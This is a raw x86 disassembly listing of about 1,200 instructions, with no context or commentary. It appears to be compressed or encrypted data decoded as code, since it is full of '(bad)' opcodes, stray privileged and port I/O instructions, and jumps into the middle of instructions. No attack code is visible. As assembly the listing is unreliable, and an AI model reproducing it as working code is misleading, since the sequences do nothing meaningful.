  42ef7a:	mov    edi,0x45473368
  42ef7f:	sbb    edx,DWORD PTR [ebx+0x2247e284]
  42ef85:	sar    DWORD PTR [esi-0x21],0x6
  42ef89:	xchg   esi,eax
  42ef8a:	lds    esp,FWORD PTR [edi+0x57]
  42ef8d:	(bad)  
  42ef8e:	dec    esi
  42ef8f:	clc    
  42ef90:	jp     0x42ef66
  42ef92:	sbb    DWORD PTR [edi+0x76],0xffffff92
  42ef96:	cmp    ch,al
  42ef98:	jecxz  0x42ef4e
  42ef9a:	xchg   BYTE PTR [ebp-0x65],dh
  42ef9d:	add    al,0x94
  42ef9f:	xor    ch,dh
  42efa1:	sbb    eax,0x7ad641d9
  42efa6:	repz js 0x42ef96
  42efa9:	gs sub eax,0xe2c727f0
  42efaf:	shl    dl,1
  42efb1:	test   eax,0x99f302a7
  42efb6:	pushf  
  42efb7:	mov    DWORD PTR [ebp+0x9556827],ebx
  42efbd:	in     eax,dx
  42efbe:	inc    ebx
  42efbf:	retf   
  42efc0:	pop    edi
  42efc1:	sub    eax,0xedb9cd4
  42efc6:	out    0x77,al
  42efc8:	out    dx,eax
  42efc9:	push   es
  42efca:	and    bh,dh
  42efcc:	pop    esp
  42efcd:	inc    BYTE PTR [ebp-0x10]
  42efd0:	pop    ds
  42efd1:	cli    
  42efd2:	repnz lahf 
  42efd4:	jno    0x42eff0
  42efd6:	sbb    ah,BYTE PTR [ebx-0x29]
  42efd9:	shr    DWORD PTR [edx+ebp*1-0x898f28d],1
  42efe0:	xchg   edx,eax
  42efe1:	leave  
  42efe2:	cdq    
  42efe3:	ficom  DWORD PTR [ecx-0x64922d36]
  42efe9:	xchg   BYTE PTR [esi+esi*8+0xd],ah
  42efed:	dec    ebx
  42efee:	hlt    
  42efef:	(bad)  
  42eff0:	push   ecx
  42eff1:	in     eax,dx
  42eff2:	(bad)  
  42eff3:	loop   0x42f069
  42eff5:	ds xchg ecx,eax
  42eff7:	cmp    BYTE PTR [eax-0x5d],ah
  42effa:	stos   BYTE PTR es:[edi],al
  42effb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42effc:	pop    ds
  42effd:	enter  0x7319,0xf7
  42f001:	pop    esp
  42f002:	inc    eax
  42f003:	mov    ebp,0x37d82969
  42f008:	pop    eax
  42f009:	pop    ss
  42f00a:	sbb    eax,0x34ac69d2
  42f00f:	nop
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	add    DWORD PTR [ebx-0x33],ebx
  42f083:	loop   0x42f0e5
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    cl,dh
  42f08d:	lahf   
  42f08e:	arpl   WORD PTR [esi],dx
  42f090:	sbb    eax,0xe712ef9d
  42f095:	jae    0x42f03b
  42f097:	les    eax,FWORD PTR [ecx+eiz*8]
  42f09a:	retf   
  42f09b:	adc    cl,BYTE PTR [ecx-0x34dc5940]
  42f0a1:	jmp    0xc6ccf97e
  42f0a6:	fcomp  DWORD PTR [edi]
  42f0a8:	add    eax,ebp
  42f0aa:	shl    BYTE PTR [ebp-0x24],cl
  42f0ad:	int    0x16
  42f0af:	adc    edx,edx
  42f0b1:	sbb    DWORD PTR [esi+0x3da78f7b],eax
  42f0b7:	xchg   ecx,eax
  42f0b8:	cli    
  42f0b9:	stos   BYTE PTR es:[edi],al
  42f0ba:	pop    es
  42f0bb:	xor    BYTE PTR [ebx],0x7e
  42f0be:	jp     0x42f139
  42f0c0:	outs   dx,BYTE PTR ds:[esi]
  42f0c1:	lds    edi,FWORD PTR [eax+0x660b142b]
  42f0c7:	jne    0x42f11c
  42f0c9:	dec    ecx
  42f0ca:	nop
  42f0cb:	rcl    BYTE PTR [ecx-0xe660ff8],1
  42f0d1:	pop    ebp
  42f0d2:	int3   
  42f0d3:	(bad)  
  42f0d4:	nop
  42f0d5:	inc    esi
  42f0d6:	gs dec esi
  42f0d8:	pop    ebp
  42f0d9:	stos   DWORD PTR es:[edi],eax
  42f0da:	int    0xc2
  42f0dc:	dec    ebx
  42f0dd:	jo     0x42f0e8
  42f0df:	dec    esp
  42f0e0:	jno    0x42f081
  42f0e2:	imul   eax,ebx,0xffffffdc
  42f0e5:	cdq    
  42f0e6:	adc    ecx,DWORD PTR [eax]
  42f0e8:	add    cl,ch
  42f0ea:	jmp    0x42f0d9
  42f0ec:	xchg   BYTE PTR [ecx+ebp*8],bl
  42f0ef:	and    edi,DWORD PTR [ecx+0x77]
  42f0f2:	neg    DWORD PTR [edi]
  42f0f4:	push   ds
  42f0f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0f6:	xor    edx,DWORD PTR [edx+0x41466cbb]
  42f0fc:	push   es
  42f0fd:	sub    ch,BYTE PTR [esi]
  42f0ff:	or     eax,0x86eb2206
  42f104:	in     al,0xf2
  42f106:	inc    ecx
  42f107:	js     0x42f10f
  42f109:	aad    0x53
  42f10b:	push   edx
  42f10c:	push   edi
  42f10d:	imul   esi,DWORD PTR [esi+0x35400f5c],0xffffffce
  42f114:	jl     0x42f139
  42f116:	ins    DWORD PTR es:[edi],dx
  42f117:	sbb    DWORD PTR [eiz*4+0x2b9aa6b9],eax
  42f11e:	mov    bh,0xcb
  42f120:	inc    ecx
  42f121:	jl     0x42f0fc
  42f123:	push   ebp
  42f124:	push   cs
  42f125:	out    dx,eax
  42f126:	cmp    DWORD PTR [eax+0x41],0x18
  42f12a:	add    edx,DWORD PTR [edi]
  42f12c:	ss (bad) 
  42f12e:	mov    ebp,0xcdad596d
  42f133:	sahf   
  42f134:	pop    eax
  42f135:	sbb    al,0x29
  42f137:	ret    0x935f
  42f13a:	lahf   
  42f13b:	std    
  42f13c:	sub    al,0x2e
  42f13e:	xchg   BYTE PTR [eax],dh
  42f140:	add    DWORD PTR [ebp+0x48d5eb9b],esi
  42f146:	mov    bl,0x54
  42f148:	sar    DWORD PTR [ecx-0x198d0978],cl
  42f14e:	xchg   edx,eax
  42f14f:	scas   al,BYTE PTR es:[edi]
  42f150:	xchg   esi,eax
  42f151:	repnz mov dl,0xa6
  42f154:	sub    eax,0xeee2546c
  42f159:	push   ecx
  42f15a:	cmp    BYTE PTR [esi+eiz*8],al
  42f15d:	jmp    0xd9a8:0x72eaacc6
  42f164:	lods   al,BYTE PTR ds:[esi]
  42f165:	jp     0x42f0f0
  42f167:	(bad)  
  42f169:	sbb    DWORD PTR [eax-0x1d4a1a69],0xffffffd2
  42f170:	dec    esi
  42f171:	push   esp
  42f172:	sub    ebx,DWORD PTR [esi+0x3e68447e]
  42f178:	or     BYTE PTR [edi-0x49],bh
  42f17b:	shr    BYTE PTR [edi],cl
  42f17d:	pop    eax
  42f17e:	mov    ds,WORD PTR [ecx]
  42f180:	stos   BYTE PTR es:[edi],al
  42f181:	fnstcw WORD PTR [edx+0x14378d20]
  42f187:	pop    ebp
  42f188:	in     al,0xb2
  42f18a:	(bad)  
  42f18b:	mov    cl,0x18
  42f18d:	sub    DWORD PTR [ecx+0x75],0x0
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	adc    edx,ebp
  42f202:	or     ch,dh
  42f204:	fs clc 
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	repz aad 0x1e
  42f20f:	dec    esi
  42f210:	ficomp DWORD PTR [edx-0x6b]
  42f213:	sbb    BYTE PTR [edi-0x17c1b907],bl
  42f219:	mov    esp,ss
  42f21b:	xchg   BYTE PTR [edi+eiz*8],cl
  42f21e:	mov    ch,0x30
  42f220:	jbe    0x42f27b
  42f222:	pop    ss
  42f223:	loopne 0x42f257
  42f225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f226:	jp     0x42f25c
  42f228:	cmp    edx,DWORD PTR [esi]
  42f22a:	daa    
  42f22b:	popf   
  42f22c:	cmp    BYTE PTR [si+0x2f],bl
  42f230:	xchg   edx,eax
  42f231:	mov    eax,0xac1dc6a5
  42f236:	xor    al,BYTE PTR [ecx+0x62714428]
  42f23c:	(bad)  [ecx+edx*1]
  42f23f:	daa    
  42f240:	cmp    eax,0x1c387bbe
  42f245:	loopne 0x42f210
  42f247:	cmp    eax,0x8ca16e6b
  42f24c:	(bad)  
  42f24d:	fxch   st(3)
  42f24f:	test   ch,0xbc
  42f252:	inc    edx
  42f253:	cld    
  42f254:	es int3 
  42f256:	jmp    0x42f217
  42f258:	add    BYTE PTR [ebp-0x26877a3d],bh
  42f25e:	retf   
  42f25f:	or     edi,ecx
  42f261:	popa   
  42f262:	fcmovnbe st,st(0)
  42f264:	xchg   ebx,eax
  42f265:	push   ebp
  42f266:	mov    dl,0x87
  42f268:	stc    
  42f269:	mov    ds:0x3f1e6633,eax
  42f26e:	sub    eax,0x85163853
  42f273:	pop    ds
  42f274:	jp     0x42f2f4
  42f276:	fdiv   QWORD PTR [ebp+eiz*4-0x5e]
  42f27a:	cmp    al,0x8b
  42f27c:	adc    eax,0xa9ac9d8d
  42f281:	stc    
  42f282:	stos   BYTE PTR es:[edi],al
  42f283:	test   cl,0x9f
  42f286:	int    0xcb
  42f288:	fsubr  st(3),st
  42f28a:	cmp    BYTE PTR [ebx+0x10],al
  42f28d:	or     eax,0xdfcd5690
  42f292:	push   ebp
  42f293:	icebp  
  42f294:	sub    eax,0x291b0fd4
  42f299:	pop    ss
  42f29a:	or     BYTE PTR [esp+eiz*8],dl
  42f29d:	fst    QWORD PTR [ebx-0x7e37761a]
  42f2a3:	aad    0xaf
  42f2a5:	sahf   
  42f2a6:	out    0x1b,al
  42f2a8:	jne    0x42f30e
  42f2aa:	stc    
  42f2ab:	mov    ecx,0x5c08c9a9
  42f2b0:	cmp    al,0x9c
  42f2b2:	mov    al,0xe7
  42f2b4:	xchg   ebx,eax
  42f2b5:	xchg   esp,eax
  42f2b6:	pop    esi
  42f2b7:	pushf  
  42f2b8:	inc    eax
  42f2b9:	les    ebx,FWORD PTR [edi+0x2a]
  42f2bc:	mov    ch,0x54
  42f2be:	fld    DWORD PTR [edi+0x25710404]
  42f2c4:	jle    0x42f25b
  42f2c6:	ret    
  42f2c7:	enter  0xbcaa,0x39
  42f2cb:	mul    BYTE PTR [esi]
  42f2cd:	ret    
  42f2ce:	xchg   BYTE PTR [edx],al
  42f2d0:	ins    DWORD PTR es:[edi],dx
  42f2d1:	test   bh,al
  42f2d3:	(bad)  
  42f2d5:	dec    esi
  42f2d6:	inc    eax
  42f2d7:	mov    WORD PTR [esi+ebx*8-0x21],ss
  42f2db:	push   esp
  42f2dc:	add    edi,DWORD PTR ds:0x4df4b3b7
  42f2e2:	pop    eax
  42f2e3:	push   0x78718dd2
  42f2e8:	mov    bl,0x62
  42f2ea:	mov    ds:0xa879e8f,eax
  42f2ef:	mov    cl,cl
  42f2f1:	shl    DWORD PTR [edx],cl
  42f2f3:	fst    DWORD PTR [eax]
  42f2f5:	sbb    BYTE PTR [ecx+0xdaec6fa],ah
  42f2fb:	nop
  42f2fc:	stos   DWORD PTR es:[edi],eax
  42f2fd:	jbe    0x42f358
  42f2ff:	push   ecx
  42f300:	cs lock retf 0xe532
  42f305:	pop    es
  42f306:	jmp    0x5b4dd218
  42f30b:	mov    al,0x3d
  42f30d:	(bad)  
  42f30e:	js     0x42f297
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	mov    ds,WORD PTR [edi-0x697c6a7]
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    al,0x1
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	aam    0x3e
  42f38e:	adc    DWORD PTR [ecx],eax
  42f390:	ret    
  42f391:	shl    esi,1
  42f393:	push   esi
  42f394:	dec    edi
  42f395:	xor    bl,BYTE PTR [ebx+0x46]
  42f398:	lock dec edx
  42f39a:	sub    DWORD PTR [ebx-0x3e],edx
  42f39d:	loopne 0x42f322
  42f39f:	fadd   st,st(3)
  42f3a1:	shr    DWORD PTR [eax],cl
  42f3a3:	repz arpl WORD PTR [ecx+0x2a],sp
  42f3a7:	in     eax,dx
  42f3a8:	and    BYTE PTR [eax+0x60c61f22],dl
  42f3ae:	ja     0x42f347
  42f3b0:	sub    ecx,esi
  42f3b2:	jne    0x42f366
  42f3b4:	jge    0x42f39d
  42f3b6:	dec    ebx
  42f3b7:	xchg   BYTE PTR [edx],bh
  42f3b9:	retf   0xaf3f
  42f3bc:	sbb    DWORD PTR [edx-0x61b3e256],edi
  42f3c2:	xchg   ebx,eax
  42f3c3:	das    
  42f3c4:	sbb    bh,bh
  42f3c6:	fsubr  DWORD PTR fs:[edi-0x59]
  42f3ca:	hlt    
  42f3cb:	push   ebp
  42f3cc:	sub    edi,DWORD PTR [ebx+0x50]
  42f3cf:	sbb    eax,0x2578db56
  42f3d4:	inc    edx
  42f3d5:	int    0xac
  42f3d7:	add    BYTE PTR [eax],ch
  42f3d9:	cmp    BYTE PTR [ebx],al
  42f3db:	arpl   WORD PTR [ebp+0x4d3afd1e],ax
  42f3e1:	mov    dl,0xb6
  42f3e3:	pushf  
  42f3e4:	outs   dx,BYTE PTR ds:[esi]
  42f3e5:	and    BYTE PTR [ebp-0x775c8f0b],ah
  42f3eb:	mov    ecx,DWORD PTR [ebx+0x7b]
  42f3ee:	xor    al,BYTE PTR [esi+0x36]
  42f3f1:	mov    ch,0x82
  42f3f3:	sub    al,0x81
  42f3f5:	or     DWORD PTR [ecx-0x5d0fcb5b],eax
  42f3fb:	cmp    eax,0xcaa8c8c8
  42f400:	xchg   ebx,eax
  42f401:	sub    eax,DWORD PTR [ecx+0x7760d3a1]
  42f407:	mov    ds:0x9329e75d,eax
  42f40c:	test   eax,0xb7dfcd19
  42f411:	ins    BYTE PTR es:[edi],dx
  42f412:	or     eax,0x160cf1c4
  42f417:	xchg   DWORD PTR [ebx],esi
  42f419:	cmp    eax,0xae4eceb6
  42f41e:	adc    ah,BYTE PTR [esi+0x53]
  42f421:	scas   eax,DWORD PTR es:[edi]
  42f422:	test   BYTE PTR [ebx+ecx*4+0x69617078],0xa2
  42f42a:	std    
  42f42b:	sbb    al,0xf2
  42f42d:	and    al,0xb0
  42f42f:	mov    edi,0x65086858
  42f434:	pop    esp
  42f435:	stos   BYTE PTR es:[edi],al
  42f436:	xchg   esi,eax
  42f437:	sub    BYTE PTR [ecx+0x62],0xaa
  42f43b:	ds and al,0xc7
  42f43e:	jp     0x42f464
  42f440:	je     0x42f4b5
  42f442:	mov    edx,0xa6cc33c1
  42f447:	xor    BYTE PTR [eax],0xf8
  42f44a:	(bad)  [ecx-0x612cf1d6]
  42f450:	sti    
  42f451:	adc    bl,BYTE PTR [edi-0x17]
  42f454:	pop    ebx
  42f455:	push   0x59
  42f457:	popa   
  42f458:	push   ebx
  42f459:	aas    
  42f45a:	popf   
  42f45b:	jmp    0x2a9c:0xf7f04903
  42f462:	pop    ecx
  42f463:	fs mov ebp,0xeac4347
  42f469:	jno    0x42f431
  42f46b:	mov    ebp,0xae70df0c
  42f470:	retf   0x87b6
  42f473:	push   ss
  42f474:	inc    esi
  42f475:	imul   ebp,DWORD PTR [ebp-0x2a],0xffffffc5
  42f479:	sub    eax,0xf1af49d8
  42f47e:	lock push 0x75ec4ced
  42f484:	outs   dx,DWORD PTR ds:[esi]
  42f485:	das    
  42f486:	dec    ebx
  42f487:	sbb    eax,0x88f3dc9c
  42f48c:	loope  0x42f47f
  42f48e:	xor    al,0xe2
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	retf   0x9e22
  42f503:	fisubr DWORD PTR [edx+edi*8+0x1]
  42f507:	add    BYTE PTR [ecx+eax*1],al
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	aam    0xd4
  42f50e:	rcr    BYTE PTR [eax],0xbf
  42f511:	or     edx,DWORD PTR [eax]
  42f513:	fstp   DWORD PTR [edx]
  42f515:	sub    al,0x19
  42f517:	push   ebx
  42f518:	aas    
  42f519:	int    0x63
  42f51b:	sbb    edi,ebp
  42f51d:	push   ebx
  42f51e:	test   eax,0xa19f026f
  42f523:	out    dx,al
  42f524:	fcomp  QWORD PTR [edx+0x3b]
  42f527:	pop    ds
  42f528:	inc    edi
  42f529:	jo     0x42f52f
  42f52b:	sbb    eax,DWORD PTR ds:0x4cf4c65d
  42f531:	push   ebp
  42f532:	imul   esi,esi,0x8044c817
  42f538:	(bad)  
  42f539:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f53b:	jne    0x42f516
  42f53d:	or     ah,cl
  42f53f:	and    eax,0x190315be
  42f544:	add    al,0xfd
  42f546:	ror    DWORD PTR [eax],0x40
  42f549:	add    dl,bl
  42f54b:	dec    ebp
  42f54c:	xor    eax,0x5f69d31f
  42f551:	iret   
  42f552:	mov    dh,0xe7
  42f554:	ja     0x42f50c
  42f556:	stos   BYTE PTR es:[edi],al
  42f557:	call   0xbcb0985
  42f55c:	jbe    0x42f511
  42f55e:	std    
  42f55f:	hlt    
  42f560:	sti    
  42f561:	sysret 
  42f563:	adc    DWORD PTR [eax+0xb],esi
  42f566:	mov    ebp,0xe38b608d
  42f56b:	aas    
  42f56c:	inc    esp
  42f56d:	test   eax,0x526881
  42f572:	pop    ebx
  42f573:	mov    ebx,0x3dcb2c41
  42f578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f579:	(bad)  
  42f57a:	pop    esi
  42f57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f57c:	rol    cl,0x14
  42f57f:	test   BYTE PTR [esi+ecx*8-0x7b49c5bc],bl
  42f586:	aaa    
  42f587:	inc    eax
  42f588:	(bad)  
  42f589:	jecxz  0x42f549
  42f58b:	jge    0x42f517
  42f58d:	test   al,0x29
  42f58f:	jb     0x42f579
  42f591:	and    BYTE PTR [ecx-0xe0b1e1d],ch
  42f597:	stos   DWORD PTR es:[edi],eax
  42f598:	stc    
  42f599:	and    ecx,DWORD PTR [ecx]
  42f59b:	cmp    ecx,DWORD PTR [ecx]
  42f59d:	mov    eax,0xdc439488
  42f5a2:	inc    esi
  42f5a3:	je     0x42f581
  42f5a5:	les    ecx,FWORD PTR [eax]
  42f5a7:	cwde   
  42f5a8:	hlt    
  42f5a9:	(bad)  
  42f5aa:	ds push edx
  42f5ac:	pop    ebx
  42f5ad:	das    
  42f5ae:	mov    dl,0x8d
  42f5b0:	pushf  
  42f5b1:	mov    al,ds:0xc481792
  42f5b6:	jmp    0xfdacd839
  42f5bb:	jge    0x42f5e5
  42f5bd:	adc    DWORD PTR [edi],edx
  42f5bf:	sub    eax,0x9ad91095
  42f5c4:	int    0x6d
  42f5c6:	cmp    al,0x14
  42f5c8:	loop   0x42f5a2
  42f5ca:	jmp    0xabc2:0xb8162f66
  42f5d1:	cld    
  42f5d2:	mov    cl,0x82
  42f5d4:	cmp    eax,0xe3189cff
  42f5d9:	xchg   edi,eax
  42f5da:	mov    ebx,0xa5c24e41
  42f5df:	aad    0xae
  42f5e1:	mov    eax,ds:0x8cd80f46
  42f5e6:	mov    ah,BYTE PTR [edi+0x273e57f6]
  42f5ec:	push   ebp
  42f5ed:	jno    0x42f651
  42f5ef:	sbb    DWORD PTR [ecx],esp
  42f5f1:	or     eax,DWORD PTR [edi]
  42f5f3:	push   es
  42f5f4:	cmp    BYTE PTR [edx+esi*8+0x7bda5bcc],dl
  42f5fb:	mov    ch,0xf0
  42f5fd:	mov    bl,0x8
  42f5ff:	dec    ebx
  42f600:	xchg   BYTE PTR [ebp-0x74],cl
  42f603:	out    dx,eax
  42f604:	mov    bh,BYTE PTR [eax-0x70b3aa56]
  42f60a:	sub    ebx,edi
  42f60c:	lahf   
  42f60d:	and    edi,eax
  42f60f:	jmp    0x0:0x0
	...
  42f672:	add    BYTE PTR [eax],al
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	add    eax,0x70fc5671
  42f685:	sti    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	adc    BYTE PTR [eax],ah
  42f68e:	cmp    BYTE PTR [esp+esi*4-0x74],ah
  42f692:	xor    eax,0x26f8689b
  42f697:	jnp    0x42f6a0
  42f699:	mov    esi,0x1c13e7a1
  42f69e:	ins    BYTE PTR es:[edi],dx
  42f69f:	jle    0x42f659
  42f6a1:	stc    
  42f6a2:	(bad)  
  42f6a3:	pusha  
  42f6a4:	mov    ecx,0xe3b47a58
  42f6a9:	push   ecx
  42f6aa:	lods   eax,DWORD PTR ds:[esi]
  42f6ab:	add    BYTE PTR cs:[ebx+0x4ab25dc3],dh
  42f6b2:	sbb    DWORD PTR ds:0x527781f2,0xffffffb2
  42f6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6ba:	fwait
  42f6bb:	sbb    eax,0x52b45b5e
  42f6c0:	adc    eax,0x4c6d30c2
  42f6c5:	ja     0x42f6c7
  42f6c7:	out    dx,eax
  42f6c8:	and    al,0xed
  42f6ca:	fsubr  QWORD PTR [edx-0x5337b659]
  42f6d0:	xchg   DWORD PTR [esi+ebp*2-0x48],edi
  42f6d4:	pop    es
  42f6d5:	sub    bh,BYTE PTR [ecx+edi*8+0x40df8b7d]
  42f6dc:	loopne 0x42f75d
  42f6de:	and    DWORD PTR [edi+0x3a],ecx
  42f6e1:	pop    esp
  42f6e2:	push   0xffffff95
  42f6e4:	aas    
  42f6e5:	jecxz  0x42f72d
  42f6e7:	cmp    bh,dh
  42f6e9:	(bad)  
  42f6ea:	out    dx,eax
  42f6eb:	jp     0x42f70c
  42f6ed:	mov    es:0xfd43f3fb,eax
  42f6f3:	mov    dh,0x38
  42f6f5:	ss ja  0x42f744
  42f6f8:	jecxz  0x42f692
  42f6fa:	push   ds
  42f6fb:	daa    
  42f6fc:	(bad)  
  42f6fd:	mov    ch,0x8e
  42f6ff:	pop    es
  42f700:	jns    0x42f6c6
  42f702:	nop
  42f703:	paddsb mm1,mm7
  42f706:	mov    ebp,0xd1f8ca6b
  42f70b:	dec    eax
  42f70c:	add    al,0x2e
  42f70e:	add    cl,cl
  42f710:	dec    esp
  42f711:	call   DWORD PTR [edi+0x7550f0dc]
  42f717:	outs   dx,DWORD PTR ds:[esi]
  42f718:	ins    BYTE PTR es:[edi],dx
  42f719:	mov    dl,dh
  42f71b:	(bad)  
  42f71c:	mov    al,0xc0
  42f71e:	add    cl,BYTE PTR [eax]
  42f720:	and    ebx,DWORD PTR [ecx]
  42f722:	cli    
  42f723:	cmp    DWORD PTR [ebp+0x5a],0xffffffe2
  42f727:	or     edi,DWORD PTR [ecx]
  42f729:	adc    eax,0x6bfe898c
  42f72e:	push   ebx
  42f72f:	cwde   
  42f730:	adc    dh,bh
  42f732:	mov    eax,ds:0x1e767b37
  42f737:	pushf  
  42f738:	adc    BYTE PTR [edx-0xe79d6a],0xb4
  42f73f:	stos   DWORD PTR es:[edi],eax
  42f740:	stc    
  42f741:	cmp    BYTE PTR [ebx+0x2d],ch
  42f744:	cmp    al,0xe9
  42f746:	push   ebx
  42f747:	mov    BYTE PTR [ebx+eax*2],dh
  42f74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f74b:	outs   dx,BYTE PTR ds:[esi]
  42f74c:	sbb    al,0xa5
  42f74e:	leave  
  42f74f:	test   BYTE PTR [esi+0x6617eed7],cl
  42f755:	pop    es
  42f756:	jb     0x42f7d6
  42f758:	or     al,0xd0
  42f75a:	pop    edi
  42f75b:	dec    esi
  42f75c:	jge    0x42f716
  42f75e:	xor    DWORD PTR [ebx],ebx
  42f760:	daa    
  42f761:	adc    al,0xa4
  42f763:	lods   eax,DWORD PTR ds:[esi]
  42f764:	(bad)  
  42f765:	cdq    
  42f766:	daa    
  42f767:	shl    DWORD PTR [esi],cl
  42f769:	sub    al,0x27
  42f76b:	(bad)  
  42f76c:	out    dx,eax
  42f76d:	xchg   esi,eax
  42f76e:	add    esi,ecx
  42f770:	xor    ah,cl
  42f772:	frstor [edx-0xf896240]
  42f778:	mov    ebx,0x7a683f3d
  42f77d:	mov    ebp,0xfa6a8295
  42f782:	arpl   WORD PTR [ebx+0x30],di
  42f785:	adc    BYTE PTR [esi],cl
  42f787:	lea    ebx,[ecx]
  42f789:	adc    edx,DWORD PTR [edi+0x5b5cd3ae]
  42f78f:	sub    BYTE PTR [eax],al
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x22dbaf14
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	syscall 
  42f80e:	pop    ecx
  42f80f:	dec    eax
  42f810:	xchg   edi,eax
  42f811:	clc    
  42f812:	ins    DWORD PTR es:[edi],dx
  42f813:	dec    esi
  42f814:	test   al,0x7e
  42f816:	test   BYTE PTR [eax],bh
  42f818:	(bad)  
  42f819:	xor    eax,0xdc0fa5c7
  42f81e:	mov    ecx,0xcb5e2d10
  42f823:	scas   al,BYTE PTR es:[edi]
  42f824:	jge    0x42f84d
  42f826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f827:	outs   dx,BYTE PTR es:[esi]
  42f829:	or     eax,0x1c8f0f14
  42f82e:	mov    ch,0x9b
  42f830:	pop    edx
  42f831:	mov    WORD PTR [ebp-0x35139803],gs
  42f837:	dec    edx
  42f838:	sbb    al,0x5e
  42f83a:	retf   0x1c15
  42f83d:	pop    esp
  42f83e:	call   DWORD PTR [ebp-0x6a]
  42f841:	jge    0x42f8b4
  42f843:	out    0xf0,al
  42f845:	mov    al,0x81
  42f847:	xor    DWORD PTR [ebx-0x6040d158],esp
  42f84d:	xchg   BYTE PTR [eax+0x6d],bl
  42f850:	fxch   st(4)
  42f852:	push   es
  42f853:	jg     0x42f836
  42f855:	shl    DWORD PTR [edx+edi*1-0x397f44e7],1
  42f85c:	adc    al,0x6f
  42f85e:	js     0x42f805
  42f860:	pop    esp
  42f861:	push   edx
  42f862:	xchg   edx,eax
  42f863:	ds inc esi
  42f865:	(bad)  
  42f866:	outs   dx,DWORD PTR ds:[esi]
  42f867:	xor    al,0xfd
  42f869:	and    ch,BYTE PTR [esi-0xd5509d]
  42f86f:	push   ecx
  42f870:	adc    BYTE PTR [ebp+0x78],ah
  42f873:	jg     0x42f827
  42f875:	gs loope 0x42f8e0
  42f878:	div    BYTE PTR [ecx]
  42f87a:	daa    
  42f87b:	imul   esp,edi,0xffffffde
  42f87e:	shl    DWORD PTR [eax+0xb],1
  42f881:	arpl   dx,sp
  42f883:	mov    al,ds:0x4f56cc62
  42f888:	xor    ecx,DWORD PTR [edi+0x9cba6d3]
  42f88e:	xchg   edi,eax
  42f88f:	in     eax,dx
  42f890:	inc    edi
  42f891:	adc    edx,DWORD PTR [edx-0x738b6305]
  42f897:	leave  
  42f898:	sti    
  42f899:	add    BYTE PTR [edi+0x1f],bh
  42f89c:	enter  0xe4d0,0xd1
  42f8a0:	push   esp
  42f8a1:	dec    ebx
  42f8a2:	xor    al,0x58
  42f8a4:	pop    ds
  42f8a5:	mov    esp,0xd5f92121
  42f8aa:	push   esp
  42f8ab:	xor    al,0xb3
  42f8ad:	aaa    
  42f8ae:	ins    DWORD PTR es:[edi],dx
  42f8af:	adc    DWORD PTR [eax+ebp*4-0x15],esi
  42f8b3:	hlt    
  42f8b4:	add    ecx,DWORD PTR [ebp-0x12be07af]
  42f8ba:	push   esp
  42f8bb:	push   edx
  42f8bc:	jmp    0x9644:0x439f9a0a
  42f8c3:	les    ebp,FWORD PTR [ebp+0x574e1348]
  42f8c9:	in     eax,dx
  42f8ca:	pushf  
  42f8cb:	mov    dl,BYTE PTR [ebx+eiz*8-0x482e82dd]
  42f8d2:	mov    ds:0xa06fd4e3,eax
  42f8d7:	jne    0x42f8da
  42f8d9:	dec    esi
  42f8da:	xor    ebx,DWORD PTR [eax]
  42f8dc:	mov    eax,0x80256d7c
  42f8e1:	scas   eax,DWORD PTR es:[edi]
  42f8e2:	cmp    cl,BYTE PTR [ecx-0xba63a4]
  42f8e8:	ret    
  42f8e9:	cdq    
  42f8ea:	or     ah,BYTE PTR ss:[ecx]
  42f8ed:	fidiv  WORD PTR [eax+ebp*4-0x1b]
  42f8f1:	push   es
  42f8f2:	mov    WORD PTR [edx+0x6],ss
  42f8f5:	mov    ebp,0x331d1873
  42f8fa:	xlat   BYTE PTR ds:[ebx]
  42f8fb:	sbb    al,0x36
  42f8fd:	ins    BYTE PTR es:[edi],dx
  42f8fe:	sub    al,0x31
  42f900:	lds    esp,FWORD PTR [esi+0x1c25e5da]
  42f906:	pop    edi
  42f907:	stos   DWORD PTR es:[edi],eax
  42f908:	and    al,0x7
  42f90a:	push   ecx
